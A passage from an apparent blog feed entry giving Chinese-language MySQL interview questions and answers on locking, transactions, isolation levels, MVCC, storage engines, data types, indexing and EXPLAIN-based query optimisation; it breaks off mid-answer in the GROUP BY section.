    </entry>
    
    
    
    <entry>
      <title>MySQL及Redis面试题</title>
      <link href="/posts/275e/"/>
      <url>/posts/275e/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL-33"><a href="#MySQL-33" class="headerlink" title="MySQL 33"></a>MySQL 33</h2><h3 id="逻辑架构-13"><a href="#逻辑架构-13" class="headerlink" title="逻辑架构 13"></a>逻辑架构 13</h3><h4 id="Q1：MySQL-的逻辑架构了解吗？"><a href="#Q1：MySQL-的逻辑架构了解吗？" class="headerlink" title="Q1：MySQL 的逻辑架构了解吗？"></a>Q1：MySQL 的逻辑架构了解吗？</h4><p>第一层是服务器层，主要提供连接处理、授权认证、安全等功能。</p><p>第二层实现了 MySQL 核心服务功能，包括查询解析、分析、优化、缓存以及日期和时间等所有内置函数，所有跨存储引擎的功能都在这一层实现，例如存储过程、触发器、视图等。</p><p>第三层是存储引擎层，存储引擎负责 MySQL 中数据的存储和提取。服务器通过 API 与存储引擎通信，这些接口屏蔽了不同存储引擎的差异，使得差异对上层查询过程透明。除了会解析外键定义的 InnoDB 外，存储引擎不会解析 SQL，不同存储引擎之间也不会相互通信，只是简单响应上层服务器请求。</p><hr><h4 id="Q2：谈一谈-MySQL-的读写锁"><a href="#Q2：谈一谈-MySQL-的读写锁" class="headerlink" title="Q2：谈一谈 MySQL 的读写锁"></a>Q2：谈一谈 MySQL 的读写锁</h4><p>在处理并发读或写时，可以通过实现一个由两种类型组成的锁系统来解决问题。这两种类型的锁通常被称为共享锁和排它锁，也叫读锁和写锁。读锁是共享的，相互不阻塞，多个客户在同一时刻可以同时读取同一个资源而不相互干扰。写锁则是排他的，也就是说一个写锁会阻塞其他的写锁和读锁，确保在给定时间内只有一个用户能执行写入并防止其他用户读取正在写入的同一资源。</p><p>在实际的数据库系统中，每时每刻都在发生锁定，当某个用户在修改某一部分数据时，MySQL 会通过锁定防止其他用户读取同一数据。写锁比读锁有更高的优先级，一个写锁请求可能会被插入到读锁队列的前面，但是读锁不能插入到写锁前面。</p><hr><h4 id="Q3：MySQL-的锁策略有什么？"><a href="#Q3：MySQL-的锁策略有什么？" class="headerlink" title="Q3：MySQL 的锁策略有什么？"></a>Q3：MySQL 的锁策略有什么？</h4><p><strong>表锁</strong>是MySQL中最基本的锁策略，并且是开销最小的策略。表锁会锁定整张表，一个用户在对表进行写操作前需要先获得写锁，这会阻塞其他用户对该表的所有读写操作。只有没有写锁时，其他读取的用户才能获取读锁，读锁之间不相互阻塞。</p><p><strong>行锁</strong>可以最大程度地支持并发，同时也带来了最大开销。InnoDB 和 XtraDB 以及一些其他存储引擎实现了行锁。行锁只在存储引擎层实现，而服务器层没有实现。</p><hr><h4 id="Q4：数据库死锁如何解决？"><a href="#Q4：数据库死锁如何解决？" class="headerlink" title="Q4：数据库死锁如何解决？"></a>Q4：数据库死锁如何解决？</h4><p>死锁是指多个事务在同一资源上相互占用并请求锁定对方占用的资源而导致恶性循环的现象。当多个事务试图以不同顺序锁定资源时就可能会产生死锁，多个事务同时锁定同一个资源时也会产生死锁。</p><p>为了解决死锁问题，数据库系统实现了各种死锁检测和死锁超时机制。越复杂的系统，例如InnoDB 存储引擎，越能检测到死锁的循环依赖，并立即返回一个错误。这种解决方式很有效，否则死锁会导致出现非常慢的查询。还有一种解决方法，就是当查询的时间达到锁等待超时的设定后放弃锁请求，这种方式通常来说不太好。InnoDB 目前处理死锁的方法是将持有最少行级排它锁的事务进行回滚。</p><p>死锁发生之后，只有部分或者完全回滚其中一个事务，才能打破死锁。对于事务型系统这是无法避免的，所以应用程序在设计时必须考虑如何处理死锁。大多数情况下只需要重新执行因死锁回滚的事务即可。</p><hr><h4 id="Q5：事务是什么"><a href="#Q5：事务是什么" class="headerlink" title="Q5：事务是什么?"></a>Q5：事务是什么?</h4><p>事务是一组原子性的 SQL 查询，或者说一个独立的工作单元。如果数据库引擎能够成功地对数据库应用该组查询的全部语句，那么就执行该组查询。如果其中有任何一条语句因为崩溃或其他原因无法执行，那么所有的语句都不会执行。也就是说事务内的语句要么全部执行成功，要么全部执行失败。</p><hr><h4 id="Q6：事务有什么特性？"><a href="#Q6：事务有什么特性？" class="headerlink" title="Q6：事务有什么特性？"></a>Q6：事务有什么特性？</h4><p><strong>原子性 atomicity</strong></p><p>一个事务在逻辑上是必须不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，对于一个事务来说不可能只执行其中的一部分。</p><p><strong>一致性 consistency</strong></p><p>数据库总是从一个一致性的状态转换到另一个一致性的状态。</p><p><strong>隔离性 isolation</strong></p><p>针对并发事务而言，隔离性就是要隔离并发运行的多个事务之间的相互影响，一般来说一个事务所做的修改在最终提交以前，对其他事务是不可见的。</p><p><strong>持久性 durability</strong></p><p>一旦事务提交成功，其修改就会永久保存到数据库中，此时即使系统崩溃，修改的数据也不会丢失。</p><hr><h4 id="Q7：MySQL-的隔离级别有哪些？"><a href="#Q7：MySQL-的隔离级别有哪些？" class="headerlink" title="Q7：MySQL 的隔离级别有哪些？"></a>Q7：MySQL 的隔离级别有哪些？</h4><p><strong>未提交读 READ UNCOMMITTED</strong></p><p>在该级别事务中的修改即使没有被提交，对其他事务也是可见的。事务可以读取其他事务修改完但未提交的数据，这种问题称为脏读。这个级别还会导致不可重复读和幻读，性能没有比其他级别好很多，很少使用。</p><p><strong>提交读 READ COMMITTED</strong></p><p>多数数据库系统默认的隔离级别。提交读满足了隔离性的简单定义：一个事务开始时只能”看见”已经提交的事务所做的修改。换句话说，一个事务从开始直到提交之前的任何修改对其他事务都是不可见的。也叫不可重复读，因为两次执行同样的查询可能会得到不同结果。</p><p><strong>可重复读 REPEATABLE READ</strong>（MySQL默认的隔离级别）</p><p>可重复读解决了不可重复读的问题，保证了在同一个事务中多次读取同样的记录结果一致。但还是无法解决幻读，所谓幻读指的是当某个事务在读取某个范围内的记录时，会产生幻行。InnoDB 存储引擎通过多版本并发控制MVCC 解决幻读的问题。</p><p><strong>可串行化 SERIALIZABLE</strong></p><p>最高的隔离级别，通过强制事务串行执行，避免幻读。可串行化会在读取的每一行数据上都加锁，可能导致大量的超时和锁争用的问题。实际应用中很少用到这个隔离级别，只有非常需要确保数据一致性且可以接受没有并发的情况下才考虑该级别。</p><hr><h4 id="Q8：MVCC-是什么？"><a href="#Q8：MVCC-是什么？" class="headerlink" title="Q8：MVCC 是什么？"></a>Q8：MVCC 是什么？</h4><p>MVCC 是多版本并发控制，在很多情况下避免加锁，大都实现了非阻塞的读操作，写操作也只锁定必要的行。</p><p>InnoDB 的MVCC 通过在每行记录后面保存两个隐藏的列来实现，这两个列一个保存了行的创建时间，一个保存行的过期时间间。不过存储的不是实际的时间值而是系统版本号，每开始一个新的事务系统版本号都会自动递增，事务开始时刻的系统版本号会作为事务的版本号，用来和查询到的每行记录的版本号进行比较。</p><p>MVCC 只能在 <code>READ COMMITTED</code> 和 <code>REPEATABLE READ</code> 两个隔离级别下工作，因为 <code>READ UNCOMMITTED</code> 总是读取最新的数据行，而不是符合当前事务版本的数据行，而 <code>SERIALIZABLE</code> 则会对所有读取的行都加锁。</p><hr><h4 id="Q9：谈一谈-InnoDB"><a href="#Q9：谈一谈-InnoDB" class="headerlink" title="Q9：谈一谈 InnoDB"></a>Q9：谈一谈 InnoDB</h4><p>InnoDB 是 MySQL 的默认事务型引擎，用来处理大量短期事务。InnoDB 的性能和自动崩溃恢复特性使得它在非事务型存储需求中也很流行，除非有特别原因否则应该优先考虑 InnoDB。</p><p>InnoDB 的数据存储在表空间中，表空间由一系列数据文件组成。MySQL4.1 后 InnoDB 可以将每个表的数据和索引放在单独的文件中。</p><p>InnoDB 采用 MVCC 来支持高并发，并且实现了四个标准的隔离级别。其默认级别是 <code>REPEATABLE READ</code>，并通过间隙锁策略防止幻读，间隙锁使 InnoDB 不仅仅锁定查询涉及的行，还会对索引中的间隙进行锁定防止幻行的插入。</p><p>InnoDB 表是基于聚簇索引建立的，InnoDB 的索引结构和其他存储引擎有很大不同，聚簇索引对主键查询有很高的性能，不过它的二级索引中必须包含主键列，所以如果主键很大的话其他所有索引都会很大，因此如果表上索引较多的话主键应当尽可能小。</p><p>InnoDB 的存储格式是平台独立的，可以将数据和索引文件从一个平台复制到另一个平台。</p><p>InnoDB 内部做了很多优化，包括从磁盘读取数据时采用的可预测性预读，能够自动在内存中创建加速读操作的自适应哈希索引，以及能够加速插入操作的插入缓冲区等。</p><hr><h4 id="Q10：谈一谈-MyISAM"><a href="#Q10：谈一谈-MyISAM" class="headerlink" title="Q10：谈一谈 MyISAM"></a>Q10：谈一谈 MyISAM</h4><p>MySQL5.1及之前，MyISAM 是默认存储引擎，MyISAM 提供了大量的特性，包括全文索引、压缩、空间函数等，但不支持事务和行锁，最大的缺陷就是崩溃后无法安全恢复。对于只读的数据或者表比较小、可以忍受修复操作的情况仍然可以使用 MyISAM。</p><p>MyISAM 将表存储在数据文件和索引文件中，分别以 <code>.MYD</code> 和 <code>.MYI</code> 作为扩展名。MyISAM 表可以包含动态或者静态行，MySQL 会根据表的定义决定行格式。MyISAM 表可以存储的行记录数一般受限于可用磁盘空间或者操作系统中单个文件的最大尺寸。</p><p>MyISAM 对整张表进行加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但是在表有读取查询的同时，也支持并发往表中插入新的记录。</p><p>对于MyISAM 表，MySQL 可以手动或自动执行检查和修复操作，这里的修复和事务恢复以及崩溃恢复的概念不同。执行表的修复可能导致一些数据丢失，而且修复操作很慢。</p><p>对于 MyISAM 表，即使是 BLOB 和 TEXT 等长字段，也可以基于其前 500 个字符创建索引。MyISAM 也支持全文索引，这是一种基于分词创建的索引，可以支持复杂的查询。</p><p>MyISAM 设计简单，数据以紧密格式存储，所以在某些场景下性能很好。MyISAM 最典型的性能问题还是表锁问题，如果所有的查询长期处于 Locked 状态，那么原因毫无疑问就是表锁。</p><hr><h4 id="Q12：谈一谈-Memory"><a href="#Q12：谈一谈-Memory" class="headerlink" title="Q12：谈一谈 Memory"></a>Q12：谈一谈 Memory</h4><p>如果需要快速访问数据且这些数据不会被修改，重启以后丢失也没有关系，那么使用 Memory 表是非常有用的。Memory 表至少要比 MyISAM 表快一个数量级，因为所有数据都保存在内存，不需要磁盘 IO，Memory 表的结构在重启后会保留，但数据会丢失。</p><p>Memory 表适合的场景：查找或者映射表、缓存周期性聚合数据的结果、保存数据分析中产生的中间数据。</p><p>Memory 表支持哈希索引，因此查找速度极快。虽然速度很快但还是无法取代传统的基于磁盘的表，Memory 表使用表级锁，因此并发写入的性能较低。它不支持 BLOB 和 TEXT 类型的列，并且每行的长度是固定的，所以即使指定了 VARCHAR 列，实际存储时也会转换成CHAR，这可能导致部分内存的浪费。</p><p>如果 MySQL 在执行查询的过程中需要使用临时表来保持中间结果，内部使用的临时表就是 Memory 表。如果中间结果太大超出了Memory 表的限制，或者含有 BLOB 或 TEXT 字段，临时表会转换成 MyISAM 表。</p><hr><h4 id="Q13：查询执行流程是什么？"><a href="#Q13：查询执行流程是什么？" class="headerlink" title="Q13：查询执行流程是什么？"></a>Q13：查询执行流程是什么？</h4><p>简单来说分为五步：① 客户端发送一条查询给服务器。② 服务器先检查查询缓存，如果命中了缓存则立刻返回存储在缓存中的结果，否则进入下一阶段。③ 服务器端进行 SQL 解析、预处理，再由优化器生成对应的执行计划。④ MySQL 根据优化器生成的执行计划，调用存储引擎的 API 来执行查询。⑤ 将结果返回给客户端。 </p><hr><h3 id="数据类型-3"><a href="#数据类型-3" class="headerlink" title="数据类型 3"></a>数据类型 3</h3><h4 id="Q1：VARCHAR-和-CHAR-的区别？"><a href="#Q1：VARCHAR-和-CHAR-的区别？" class="headerlink" title="Q1：VARCHAR 和 CHAR 的区别？"></a>Q1：VARCHAR 和 CHAR 的区别？</h4><p><strong>VARCHAR</strong> 用于存储可变字符串，是最常见的字符串数据类型。它比 CHAR 更节省空间，因为它仅使用必要的空间。VARCHAR 需要 1 或 2 个额外字节记录字符串长度，如果列的最大长度不大于 255 字节则只需要 1 字节。VARCHAR 不会删除末尾空格。</p><p>VARCHAR 适用场景：字符串列的最大长度比平均长度大很多、列的更新很少、使用了 UTF8 这种复杂字符集，每个字符都使用不同的字节数存储。</p><p><strong>CHAR</strong> 是定长的，根据定义的字符串长度分配足够的空间。CHAR 会删除末尾空格。</p><p>CHAR 适合存储很短的字符串，或所有值都接近同一个长度，例如存储密码的 MD5 值。对于经常变更的数据，CHAR 也比 VARCHAR更好，因为定长的 CHAR 不容易产生碎片。对于非常短的列，CHAR 在存储空间上也更有效率，例如用 CHAR 来存储只有 Y 和 N 的值只需要一个字节，但是 VARCHAR 需要两个字节，因为还有一个记录长度的额外字节。</p><hr><h4 id="Q2：DATETIME-和-TIMESTAMP-的区别？"><a href="#Q2：DATETIME-和-TIMESTAMP-的区别？" class="headerlink" title="Q2：DATETIME 和 TIMESTAMP 的区别？"></a>Q2：DATETIME 和 TIMESTAMP 的区别？</h4><p><strong>DATETIME</strong> 能保存大范围的值，从 1001~9999 年，精度为秒。把日期和时间封装到了一个整数中，与时区无关，使用 8 字节存储空间。</p><p><strong>TIMESTAMP</strong> 和 UNIX 时间戳相同，只使用 4 字节的存储空间，范围比 DATETIME 小得多，只能表示 1970 ~2038 年，并且依赖于时区。</p><hr><h4 id="Q3：数据类型有哪些优化策略？"><a href="#Q3：数据类型有哪些优化策略？" class="headerlink" title="Q3：数据类型有哪些优化策略？"></a>Q3：数据类型有哪些优化策略？</h4><p><strong>更小的通常更好</strong></p><p>一般情况下尽量使用可以正确存储数据的最小数据类型，更小的数据类型通常也更快，因为它们占用更少的磁盘、内存和 CPU 缓存。</p><p><strong>尽可能简单</strong></p><p>简单数据类型的操作通常需要更少的 CPU 周期，例如整数比字符操作代价更低，因为字符集和校对规则使字符相比整形更复杂。应该使用 MySQL 的内建类型 date、time 和 datetime 而不是字符串来存储日期和时间，另一点是应该使用整形存储 IP 地址。</p><p><strong>尽量避免 NULL</strong></p><p>通常情况下最好指定列为 NOT NULL，除非需要存储 NULL值。因为如果查询中包含可为 NULL 的列对 MySQL 来说更难优化，可为 NULL 的列使索引、索引统计和值比较都更复杂，并且会使用更多存储空间。当可为 NULL 的列被索引时，每个索引记录需要一个额外字节，在MyISAM 中还可能导致固定大小的索引变成可变大小的索引。</p><p>如果计划在列上建索引，就应该尽量避免设计成可为 NULL 的列。</p><hr><h3 id="索引-10"><a href="#索引-10" class="headerlink" title="索引 10"></a>索引 10</h3><h4 id="Q1：索引有什么作用？"><a href="#Q1：索引有什么作用？" class="headerlink" title="Q1：索引有什么作用？"></a>Q1：索引有什么作用？</h4><p>索引也叫键，是存储引擎用于快速找到记录的一种数据结构。索引对于良好的性能很关键，尤其是当表中数据量越来越大时，索引对性能的影响愈发重要。在数据量较小且负载较低时，不恰当的索引对性能的影响可能还不明显，但数据量逐渐增大时，性能会急剧下降。</p><p>索引大大减少了服务器需要扫描的数据量、可以帮助服务器避免排序和临时表、可以将随机 IO 变成顺序 IO。但索引并不总是最好的工具，对于非常小的表，大部分情况下会采用全表扫描。对于中到大型的表，索引就非常有效。但对于特大型的表，建立和使用索引的代价也随之增长，这种情况下应该使用分区技术。</p><p>在MySQL中，首先在索引中找到对应的值，然后根据匹配的索引记录找到对应的数据行。索引可以包括一个或多个列的值，如果索引包含多个列，那么列的顺序也十分重要，因为 MySQL 只能使用索引的最左前缀。</p><hr><h4 id="Q2：谈一谈-MySQL-的-B-Tree-索引"><a href="#Q2：谈一谈-MySQL-的-B-Tree-索引" class="headerlink" title="Q2：谈一谈 MySQL 的 B-Tree 索引"></a>Q2：谈一谈 MySQL 的 B-Tree 索引</h4><p>大多数 MySQL 引擎都支持这种索引，但底层的存储引擎可能使用不同的存储结构，例如 NDB 使用 T-Tree，而 InnoDB 使用 B+ Tree。</p><p>B-Tree 通常意味着所有的值都是按顺序存储的，并且每个叶子页到根的距离相同。B-Tree 索引能够加快访问数据的速度，因为存储引擎不再需要进行全表扫描来获取需要的数据，取而代之的是从索引的根节点开始进行搜索。根节点的槽中存放了指向子节点的指针，存储引擎根据这些指针向下层查找。通过比较节点页的值和要查找的值可以找到合适的指针进入下层子节点，这些指针实际上定义了子节点页中值的上限和下限。最终存储引擎要么找到对应的值，要么该记录不存在。叶子节点的指针指向的是被索引的数据，而不是其他的节点页。</p><p>B-Tree索引的限制：</p><ul><li>如果不是按照索引的最左列开始查找，则无法使用索引。</li><li>不能跳过索引中的列，例如索引为 (id,name,sex)，不能只使用 id 和 sex 而跳过 name。</li><li>如果查询中有某个列的范围查询，则其右边的所有列都无法使用索引。</li></ul><hr><h4 id="Q3：了解-Hash-索引吗？"><a href="#Q3：了解-Hash-索引吗？" class="headerlink" title="Q3：了解 Hash 索引吗？"></a>Q3：了解 Hash 索引吗？</h4><p>哈希索引基于哈希表实现，只有精确匹配索引所有列的查询才有效。对于每一行数据，存储引擎都会对所有的索引列计算一个哈希码，哈希码是一个较小的值，并且不同键值的行计算出的哈希码也不一样。哈希索引将所有的哈希码存储在索引中，同时在哈希表中保存指向每个数据行的指针。</p><p>只有 Memory 引擎显式支持哈希索引，这也是 Memory 引擎的默认索引类型。</p><p>因为索引自身只需存储对应的哈希值，所以索引的结构十分紧凑，这让哈希索引的速度非常快，但它也有一些限制：</p><ul><li>哈希索引数据不是按照索引值顺序存储的，无法用于排序。</li><li>哈希索引不支持部分索引列匹配查找，因为哈希索引始终是使用索引列的全部内容来计算哈希值的。例如在数据列(a,b)上建立哈希索引，如果查询的列只有a就无法使用该索引。</li><li>哈希索引只支持等值比较查询，不支持任何范围查询。</li></ul><hr><h4 id="Q4：什么是自适应哈希索引？"><a href="#Q4：什么是自适应哈希索引？" class="headerlink" title="Q4：什么是自适应哈希索引？"></a>Q4：什么是自适应哈希索引？</h4><p>自适应哈希索引是 InnoDB 引擎的一个特殊功能，当它注意到某些索引值被使用的非常频繁时，会在内存中基于 B-Tree 索引之上再创键一个哈希索引，这样就让 B-Tree 索引也具有哈希索引的一些优点，比如快速哈希查找。这是一个完全自动的内部行为，用户无法控制或配置，但如果有必要可以关闭该功能。</p><hr><h4 id="Q5-：什么是空间索引？"><a href="#Q5-：什么是空间索引？" class="headerlink" title="Q5 ：什么是空间索引？"></a>Q5 ：什么是空间索引？</h4><p>MyISAM 表支持空间索引，可以用作地理数据存储。和 B-Tree 索引不同，这类索引无需前缀查询。空间索引会从所有维度来索引数据，查询时可以有效地使用任意维度来组合查询。必须使用 MySQL 的 GIS 即地理信息系统的相关函数来维护数据，但 MySQL 对 GIS 的支持并不完善，因此大部分人都不会使用这个特性。</p><hr><h4 id="Q6：什么是全文索引？"><a href="#Q6：什么是全文索引？" class="headerlink" title="Q6：什么是全文索引？"></a>Q6：什么是全文索引？</h4><p>通过数值比较、范围过滤等就可以完成绝大多数需要的查询，但如果希望通过关键字匹配进行查询，就需要基于相似度的查询，而不是精确的数值比较，全文索引就是为这种场景设计的。</p><p>MyISAM 的全文索引是一种特殊的 B-Tree 索引，一共有两层。第一层是所有关键字，然后对于每一个关键字的第二层，包含的是一组相关的”文档指针”。全文索引不会索引文档对象中的所有词语，它会根据规则过滤掉一些词语，例如停用词列表中的词都不会被索引。</p><hr><h4 id="Q7：什么是聚簇索引？"><a href="#Q7：什么是聚簇索引？" class="headerlink" title="Q7：什么是聚簇索引？"></a>Q7：什么是聚簇索引？</h4><p>聚簇索引不是一种索引类型，而是一种数据存储方式。InnoDB 的聚簇索引实际上在同一个结构中保存了 B-Tree 索引和数据行。当表有聚餐索引时，它的行数据实际上存放在索引的叶子页中，因为无法同时把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。</p><p>优点：① 可以把相关数据保存在一起。② 数据访问更快，聚簇索引将索引和数据保存在同一个 B-Tree 中，因此获取数据比非聚簇索引要更快。③ 使用覆盖索引扫描的查询可以直接使用页节点中的主键值。</p><p>缺点：① 聚簇索引最大限度提高了 IO 密集型应用的性能，如果数据全部在内存中将会失去优势。② 更新聚簇索引列的代价很高，因为会强制每个被更新的行移动到新位置。③ 基于聚簇索引的表插入新行或主键被更新导致行移动时，可能导致页分裂，表会占用更多磁盘空间。④ 当行稀疏或由于页分裂导致数据存储不连续时，全表扫描可能很慢。</p><hr><h4 id="Q8：什么是覆盖索引？"><a href="#Q8：什么是覆盖索引？" class="headerlink" title="Q8：什么是覆盖索引？"></a>Q8：什么是覆盖索引？</h4><p>覆盖索引指一个索引包含或覆盖了所有需要查询的字段的值，不再需要根据索引回表查询数据。覆盖索引必须要存储索引列的值，因此 MySQL 只能使用 B-Tree 索引做覆盖索引。</p><p>优点：① 索引条目通常远小于数据行大小，可以极大减少数据访问量。② 因为索引按照列值顺序存储，所以对于 IO 密集型防伪查询回避随机从磁盘读取每一行数据的 IO 少得多。③ 由于 InnoDB 使用聚簇索引，覆盖索引对 InnoDB 很有帮助。InnoDB 的二级索引在叶子节点保存了行的主键值，如果二级主键能覆盖查询那么可以避免对主键索引的二次查询。</p><hr><h4 id="Q9：你知道哪些索引使用原则？"><a href="#Q9：你知道哪些索引使用原则？" class="headerlink" title="Q9：你知道哪些索引使用原则？"></a>Q9：你知道哪些索引使用原则？</h4><p><strong>建立索引</strong></p><p>对查询频次较高且数据量比较大的表建立索引。索引字段的选择，最佳候选列应当从 WHERE 子句的条件中提取，如果 WHERE 子句中的组合比较多，应当挑选最常用、过滤效果最好的列的组合。业务上具有唯一特性的字段，即使是多个字段的组合，也必须建成唯一索引。</p><p><strong>使用前缀索引</strong></p><p>索引列开始的部分字符，索引创建后也是使用硬盘来存储的，因此短索引可以提升索引访问的 IO 效率。对于 BLOB、TEXT 或很长的 VARCHAR 列必须使用前缀索引，MySQL 不允许索引这些列的完整长度。前缀索引是一种能使索引更小更快的有效方法，但缺点是 MySQL 无法使用前缀索引做 ORDER BY 和 GROUP BY，也无法使用前缀索引做覆盖扫描。</p><p><strong>选择合适的索引顺序</strong></p><p>当不需要考虑排序和分组时，将选择性最高的列放在前面。索引的选择性是指不重复的索引值和数据表的记录总数之比，索引的选择性越高则查询效率越高，唯一索引的选择性是 1，因此也可以使用唯一索引提升查询效率。</p><p><strong>删除无用索引</strong></p><p>MySQL 允许在相同列上创建多个索引，重复的索引需要单独维护，并且优化器在优化查询时也需要逐个考虑，这会影响性能。重复索引是指在相同的列上按照相同的顺序创建的相同类型的索引，应该避免创建重复索引。如果创建了索引 (A,B) 再创建索引 (A) 就是冗余索引，因为这只是前一个索引的前缀索引，对于 B-Tree 索引来说是冗余的。解决重复索引和冗余索引的方法就是删除这些索引。除了重复索引和冗余索引，可能还会有一些服务器永远不用的索引，也应该考虑删除。</p><hr><h4 id="Q10：索引失效的情况有哪些？"><a href="#Q10：索引失效的情况有哪些？" class="headerlink" title="Q10：索引失效的情况有哪些？"></a>Q10：索引失效的情况有哪些？</h4><p>如果索引列出现了隐式类型转换，则 MySQL 不会使用索引。常见的情况是在 SQL 的 WHERE 条件中字段类型为字符串，其值为数值，如果没有加引号那么 MySQL 不会使用索引。</p><p>如果 WHERE 条件中含有 OR，除非 OR 前使用了索引列而 OR 之后是非索引列，索引会失效。</p><p>MySQL 不能在索引中执行 LIKE 操作，这是底层存储引擎 API 的限制，最左匹配的 LIKE 比较会被转换为简单的比较操作，但如果是以通配符开头的 LIKE 查询，存储引擎就无法做比较。这种情况下 MySQL 只能提取数据行的值而不是索引值来做比较。</p><p>如果查询中的列不是独立的，则 MySQL 不会使用索引。独立的列是指索引列不能是表达式的一部分，也不能是函数的参数。</p><p>对于多个范围条件查询，MySQL 无法使用第一个范围列后面的其他索引列，对于多个等值查询则没有这种限制。</p><p>如果 MySQL 判断全表扫描比使用索引查询更快，则不会使用索引。</p><p>索引文件具有 B-Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。</p><hr><h3 id="优化-5"><a href="#优化-5" class="headerlink" title="优化 5"></a>优化 5</h3><h4 id="Q1：如何定位低效-SQL？"><a href="#Q1：如何定位低效-SQL？" class="headerlink" title="Q1：如何定位低效 SQL？"></a>Q1：如何定位低效 SQL？</h4><p>可以通过两种方式来定位执行效率较低的 SQL 语句。一种是通过慢查询日志定位，可以通过慢查询日志定位那些已经执行完毕的 SQL 语句。另一种是使用 SHOW PROCESSLIST 查询，慢查询日志在查询结束以后才记录，所以在应用反应执行效率出现问题的时候查询慢查询日志不能定位问题，此时可以使用 SHOW PROCESSLIST 命令查看当前 MySQL 正在进行的线程，包括线程的状态、是否锁表等，可以实时查看 SQL 的执行情况，同时对一些锁表操作进行优化。找到执行效率低的 SQL 语句后，就可以通过 SHOW PROFILE、EXPLAIN 或 trace 等丰富来继续优化语句。</p><hr><h4 id="Q2：SHOW-PROFILE-的作用？"><a href="#Q2：SHOW-PROFILE-的作用？" class="headerlink" title="Q2：SHOW PROFILE 的作用？"></a>Q2：SHOW PROFILE 的作用？</h4><p>通过 SHOW PROFILE 可以分析 SQL 语句性能消耗，例如查询到 SQL 会执行多少时间，并显示 CPU、内存使用量，执行过程中系统锁及表锁的花费时间等信息。例如 <code>SHOW PROFILE CPU/MEMORY/BLOCK IO FOR QUERY N</code> 分别查询 id 为 N 的 SQL 语句的 CPU、内存以及 IO 的消耗情况。</p><hr><h4 id="Q3：trace-是干什么的？"><a href="#Q3：trace-是干什么的？" class="headerlink" title="Q3：trace 是干什么的？"></a>Q3：trace 是干什么的？</h4><p>从 MySQL5.6 开始，可以通过 trace 文件进一步获取优化器是是如何选择执行计划的，在使用时需要先打开设置，然后执行一次 SQL，最后查看 information_schema.optimizer_trace 表而都内容，该表为联合i表，只能在当前会话进行查询，每次查询后返回的都是最近一次执行的 SQL 语句。</p><hr><h4 id="Q4：EXPLAIN-的字段有哪些，具有什么含义？"><a href="#Q4：EXPLAIN-的字段有哪些，具有什么含义？" class="headerlink" title="Q4：EXPLAIN 的字段有哪些，具有什么含义？"></a>Q4：EXPLAIN 的字段有哪些，具有什么含义？</h4><p>执行计划是 SQL 调优的一个重要依据，可以通过 EXPLAIN 命令查看 SQL 语句的执行计划，如果作用在表上，那么该命令相当于 DESC。EXPLAIN 的指标及含义如下：</p><table><thead><tr><th>指标名</th><th>含义</th></tr></thead><tbody><tr><td>id</td><td>表示 SELECT 子句或操作表的顺序，执行顺序从大到小执行，当 id 一样时，执行顺序从上往下。</td></tr><tr><td>select_type</td><td>表示查询中每个 SELECT 子句的类型，例如 SIMPLE 表示不包含子查询、表连接或其他复杂语法的简单查询，PRIMARY 表示复杂查询的最外层查询，SUBQUERY 表示在 SELECT 或 WHERE 列表中包含了子查询。</td></tr><tr><td>type</td><td>表示访问类型，性能由差到好为：ALL 全表扫描、index 索引全扫描、range 索引范围扫描、ref 返回匹配某个单独值得所有行，常见于使用非唯一索引或唯一索引的非唯一前缀进行的查找，也经常出现在 join 操作中、eq_ref 唯一性索引扫描，对于每个索引键只有一条记录与之匹配、const 当 MySQL 对查询某部分进行优化，并转为一个常量时，使用这些访问类型，例如将主键或唯一索引置于 WHERE 列表就能将该查询转为一个 const、system 表中只有一行数据或空表，只能用于 MyISAM 和 Memory 表、NULL 执行时不用访问表或索引就能得到结果。SQL 性能优化的目标：至少要达到 range 级别，要求是 ref 级别，如果可以是consts 最好。</td></tr><tr><td>possible_keys</td><td>表示查询时可能用到的索引，但不一定使用。列出大量可能索引时意味着备选索引数量太多了。</td></tr><tr><td>key</td><td>显示 MySQL 在查询时实际使用的索引，如果没有使用则显示为 NULL。</td></tr><tr><td>key_len</td><td>表示使用到索引字段的长度，可通过该列计算查询中使用的索引的长度，对于确认索引有效性以及多列索引中用到的列数目很重要。</td></tr><tr><td>ref</td><td>表示上述表的连接匹配条件，即哪些列或常量被用于查找索引列上的值。</td></tr><tr><td>rows</td><td>表示 MySQL 根据表统计信息及索引选用情况，估算找到所需记录所需要读取的行数。</td></tr><tr><td>Extra</td><td>表示额外信息，例如 Using temporary 表示需要使用临时表存储结果集，常见于排序和分组查询。Using filesort 表示无法利用索引完成的文件排序，这是 ORDER BY 的结果，可以通过合适的索引改进性能。Using index 表示只需要使用索引就可以满足查询表得要求，说明表正在使用覆盖索引。</td></tr></tbody></table><hr><h4 id="Q5：有哪些优化-SQL-的策略？"><a href="#Q5：有哪些优化-SQL-的策略？" class="headerlink" title="Q5：有哪些优化 SQL 的策略？"></a>Q5：有哪些优化 SQL 的策略？</h4><p><strong>优化 COUNT 查询</strong></p><p>COUNT 是一个特殊的函数，它可以统计某个列值的数量，在统计列值时要求列值是非空的，不会统计 NULL 值。如果在 COUNT 中指定了列或列的表达式，则统计的就是这个表达式有值的结果数，而不是 NULL。</p><p>COUNT 的另一个作用是统计结果集的行数，当 MySQL 确定括号内的表达式不可能为 NULL 时，实际上就是在统计行数。当使用 COUNT(*) 时，* 不会扩展成所有列，它会忽略所有的列而直接统计所有的行数。</p><p>某些业务场景并不要求完全精确的 COUNT 值，此时可以使用近似值来代替，EXPLAIN 出来的优化器估算的行数就是一个不错的近似值，因为执行 EXPLAIN 并不需要真正地执行查询。</p><p>通常来说 COUNT 都需要扫描大量的行才能获取精确的结果，因此很难优化。在 MySQL 层还能做的就只有覆盖扫描了，如果还不够就需要修改应用的架构，可以增加汇总表或者外部缓存系统。</p><p><strong>优化关联查询</strong></p><p>确保 ON 或 USING 子句中的列上有索引，在创建索引时就要考虑到关联的顺序。</p><p>确保任何 GROUP BY 和 ORDER BY 的表达式只涉及到一个表中的列，这样 MySQL 才有可能使用索引来优化这个过程。</p><p>在 MySQL 5.5 及以下版本尽量避免子查询，可以用关联查询代替，因为执行器会先执行外部的 SQL 再执行内部的 SQL。</p><p><strong>优化 GROUP BY</strong></p><p>如果没有通过 ORDER BY 子句显式指定要排序的列，当查询使用 GROUP BY 